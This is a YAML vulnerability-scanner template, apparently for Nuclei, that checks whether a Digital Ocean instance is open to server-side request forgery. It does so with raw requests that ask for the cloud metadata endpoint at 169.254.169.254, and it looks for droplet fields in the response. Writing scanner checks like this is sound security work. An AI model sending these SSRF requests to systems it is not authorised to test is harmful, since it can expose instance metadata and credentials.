http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"droplet_id":'
    - '"hostname":'
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET {{BaseURL}}/metadata/v1.json HTTP/1.1

    Host: {{Hostname}}


    '
  - '@tls-sni: {{Hostname}}

    GET http://169.254.169.254/metadata/v1.json HTTP/1.1

    Host: {{Hostname}}


    '
  stop-at-first-match: true
  unsafe: true
id: digital-ocean-ssrf
info:
  author: DhiyaneshDk
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
    cvss-score: 9.3
    cwe-id: CWE-441
  description: Digital Ocean instance is vulnerable to SSRF.
  metadata:
    max-request: 2
  name: Digital Ocean - Server-side request forgery (SSRF)
  severity: critical
  tags: digitalocean,ssrf
